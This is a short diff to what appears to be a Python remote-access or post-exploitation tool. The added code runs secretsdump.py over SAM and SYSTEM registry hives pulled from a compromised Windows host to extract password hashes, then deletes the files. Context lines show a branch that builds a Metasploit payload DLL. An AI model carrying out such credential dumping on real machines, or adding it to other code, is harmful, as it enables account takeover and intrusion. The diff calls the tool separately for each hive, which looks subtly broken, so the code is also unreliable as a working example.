@@ -650,6 +650,17 @@ Open Ports
                     self.WaitForReply()
                     self.SendData("delete:system")
 
+                    if(os.path.isfile("downloads/sam")):
+                        subprocess.call(["./secretsdump.py", "-sam", "downloads/sam"])
+                        os.remove("downloads/sam")
+                    else:
+                        print("[+] Error dumping sam.")
+                    if(os.path.isfile("downloads/system")):
+                        subprocess.call(["./secretsdump.py", "-system", "downloads/system"])
+                        os.remove("downloads/system")
+                    else:
+                        print("[+] Error dumping system.")
+
                 elif(main == "dropmsf"):
                     os.chdir("payloads")
                     build_msf_dll()
